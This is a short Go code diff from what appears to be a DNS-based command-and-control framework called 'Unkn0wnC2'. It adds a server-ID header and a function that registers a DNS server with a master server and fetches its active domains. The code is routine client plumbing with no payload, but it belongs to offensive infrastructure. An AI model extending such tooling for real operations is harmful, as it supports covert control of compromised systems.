@@ -138,6 +138,7 @@ func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]
 
 		req.Header.Set("Content-Type", "application/json")
 		req.Header.Set("User-Agent", "Unkn0wnC2-DNSServer/0.3.0")
+		req.Header.Set("X-DNS-Server-ID", mc.serverID)
 
 		// Execute request
 		resp, err := mc.httpClient.Do(req)
@@ -182,6 +183,50 @@ func (mc *MasterClient) doRequest(method, endpoint string, body interface{}) ([]
 	}
 
 	return nil, fmt.Errorf("request failed after %d attempts: %w", maxRetries, lastErr)
+}
+
+// RegisterWithMaster registers this DNS server with the Master and retrieves active domain list
+func (mc *MasterClient) RegisterWithMaster(domain, address string) ([]string, error) {
+	req := struct {
+		ServerID string `json:"server_id"`
+		Domain   string `json:"domain"`
+		Address  string `json:"address"`
+		APIKey   string `json:"api_key"`
+	}{
+		ServerID: mc.serverID,
+		Domain:   domain,
+		Address:  address,
+		APIKey:   mc.apiKey,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/register", req)
+	if err != nil {
+		return nil, fmt.Errorf("registration failed: %w", err)
+	}
+
+	var resp struct {
+		Success bool   `json:"success"`
+		Message string `json:"message"`
+		Data    struct {
+			ServerID string   `json:"server_id"`
+			Domain   string   `json:"domain"`
+			Domains  []string `json:"domains"`
+		} `json:"data"`
+	}
+
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return nil, fmt.Errorf("failed to parse registration response: %w", err)
+	}
+
+	if !resp.Success {
+		return nil, fmt.Errorf("registration rejected: %s", resp.Message)
+	}
+
+	if mc.debug {
+		logf("[Master Client] Registered with Master - %d active domains returned", len(resp.Data.Domains))
+	}
+
+	return resp.Data.Domains, nil
 }
 
 // Checkin sends a heartbeat to the Master Server
